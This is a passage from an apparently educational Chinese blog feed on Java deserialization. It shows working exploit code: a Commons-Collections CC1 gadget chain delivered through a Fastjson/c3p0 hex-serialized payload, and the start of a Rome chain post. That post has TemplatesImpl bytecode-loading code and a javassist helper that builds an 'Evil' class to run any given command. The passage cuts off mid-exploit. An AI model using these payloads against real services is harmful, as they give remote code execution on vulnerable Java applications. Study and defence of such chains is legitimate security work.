class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexbaseGadget</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CC1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(o));</span><br><span class="line"><span class="comment">//        System.out.println(hex);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191744465.png"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C3P0 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--Romeååºåˆ—åŒ–</title>
      <link href="/2022/11/14/Rome/"/>
      <url>/2022/11/14/Rome/</url>
      
        <content type="html"><![CDATA[<h1 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h1><h2 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºä¸€ä¸ª<code>Maven</code>é¡¹ç›®ï¼Œåœ¨<code>pom.xml</code>ä¸­å¯¼å…¥<code>rome</code>ä¾èµ–</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p><strong>Gadget</strong></p><p><strong>ysoserial</strong>ä¸­çš„åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ObjectBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><h2 id="äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ"><a href="#äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ" class="headerlink" title="äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ"></a>äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ</h2><p>é“¾å°¾ä¸º<code>TemplatesImpl::getOutputProperties</code></p><p>æœ€ç»ˆåˆ©ç”¨ä¸ºTemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç å¯¼è‡´RCE</p><p><strong>TemplatesImpl</strong>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl::newTransformer()</span><br><span class="line">TemplatesImpl::getTransletInstance()</span><br><span class="line">TemplatesImpl::defineTransletClasses()</span><br><span class="line">TransletClassLoader::defineClass()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆå†™ä¸ª<strong>BadTemplatesImpl</strong>æ”¾ç€</p><p><strong>exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Calc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192007142.png" alt="image-20221116192007142"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥å°†æ¶æ„ç±»å°è£…æˆä¸€ä¸ªå‡½æ•°</p><p>éœ€è¦å¼•å…¥ä¸‹ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192146034.png" alt="image-20221116192146034"></p><p>å°¾é“¾ç°åœ¨æœ‰äº†ï¼Œé‚£æ€æ ·è°ƒç”¨åˆ°<code>getOutputProperties</code>?</p><p>ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°åœ¨<code>ToStringBean.toString(String)</code>å…ˆé€šè¿‡<code>BeanIntrospector.getPropertyDescriptors(_beanClass)</code> è·å– <code>_beanClass</code> ä¸­çš„ä»»æ„ getteræ–¹æ³•ï¼Œç„¶ååšäº†å‡ ä¸ªåˆ¤æ–­(å¯¹æˆ‘ä»¬æ„é€ æ²¡æœ‰å½±å“),æœ€åèµ°åˆ°<code>Object value = pReadMethod.invoke(_obj,NO_PARAMS)</code>ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192153048.png" alt="image-20221116192153048"></p><p>è¿™é‡Œçš„<code>pReadMethod.invoke()</code>ï¼Œå…¶å®å°±ç±»ä¼¼äºåå°„ä¸­çš„<code>method.invoke()</code>,å…¶ä¸­çš„<code>_obj</code>å‚æ•°æ˜¯å¯æ§çš„ï¼Œåœ¨å®ƒçš„æ„é€ å‡½æ•°é‡Œå°±ç›´æ¥å¯¹å…¶è¿›è¡Œäº†èµ‹å€¼ï¼Œæ‰€ä»¥é€šè¿‡<code>pReadMethod.invoke()</code> å¯ä»¥è°ƒç”¨åˆ° <code>TemplatesImpl.getOutputProperties()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192159154.png" alt="image-20221116192159154"></p><p>è¿˜æœ‰ä¸ªå°é—®é¢˜ï¼Œå› ä¸º<code>ToStringBean.toString(String)</code>ä¸º<strong>private</strong>ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œå¾€ä¸Šæ‰¾ä¸€ä¸‹ï¼Œæ— å‚çš„<code>toString()</code>å®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192203797.png" alt="image-20221116192203797"></p><p><strong>exp2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 